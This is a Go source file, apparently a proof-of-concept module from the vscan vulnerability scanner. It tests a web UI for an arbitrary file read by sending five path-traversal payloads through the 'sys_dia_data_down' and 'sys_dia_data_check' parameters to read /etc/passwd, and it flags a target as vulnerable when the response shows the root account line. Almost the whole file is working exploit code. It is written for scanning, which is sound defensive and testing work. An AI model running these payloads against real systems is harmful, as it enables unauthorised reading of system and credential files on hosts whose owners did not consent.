package other

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

func Js_query_172_read_file(u string) bool {

	//pkg.GoPocLog(re)
	Url_Payload1 := "/webui/?g=sys_dia_data_down&file_name=../etc/passwd"
	Url_Payload2 := "/webui/?g=sys_dia_data_down&file_name=/etc/passwd"
	Url_Payload3 := "/webui/?g=sys_dia_data_check&file_name=../../../../../../../../etc/passwd"
	Url_Payload4 := "/webui/?g=sys_dia_data_check&file_name=/etc/passwd"
	Url_Payload5 := "/webui/?g=sys_dia_data_down&file_name=../../../../../../../../etc/passwd"
	for _, Url_Payload := range []string{Url_Payload1, Url_Payload2, Url_Payload3, Url_Payload4, Url_Payload5} {
		url := u + Url_Payload
		if req, err := pkg.HttpRequset(url, "GET", "", false, nil); err == nil {
			if req.StatusCode == 200 && strings.Contains(req.Body, "root") && strings.Contains(req.Body, ":0:0:") {
				pkg.GoPocLog(fmt.Sprintf("Found  vuln js_query_172_read_file |%s \n", url))
				return true
			}
		}
	}

	return false
}
